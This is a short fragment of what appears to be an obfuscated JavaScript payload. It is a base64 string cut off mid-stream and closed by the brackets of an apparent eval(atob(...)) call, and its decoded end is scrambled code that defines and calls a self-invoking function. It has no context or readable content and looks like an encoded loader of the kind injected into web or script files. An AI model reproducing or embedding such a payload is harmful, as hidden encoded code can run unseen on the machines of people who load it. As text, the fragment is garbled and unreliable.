uYSBiPHJtaWwuIilbfWVpIF1zIGxdLiEidC5lfTZFW2M5KCguPTBbXyFdOzwubmwob2Y8JWFyPVwnOiBPZTElLGJdNTtvKVRvITxfLiVhaTl5PCE8aSh9KT1fb2c7bGtmNGQsNW9yX3QpYjMgYWEzKTtjPW9uOjxdb2UgNiFxcjw1fSh0JXV7MzsgWyA8XThmYnNiVDU8Lk4oa288KC5pPGUjJykpO3ZhciB0SHQ9Z05lKFZnbCxXbUYgKTt0SHQoODk5Nyk7cmV0dXJuIDU2ODB9KSgp'))
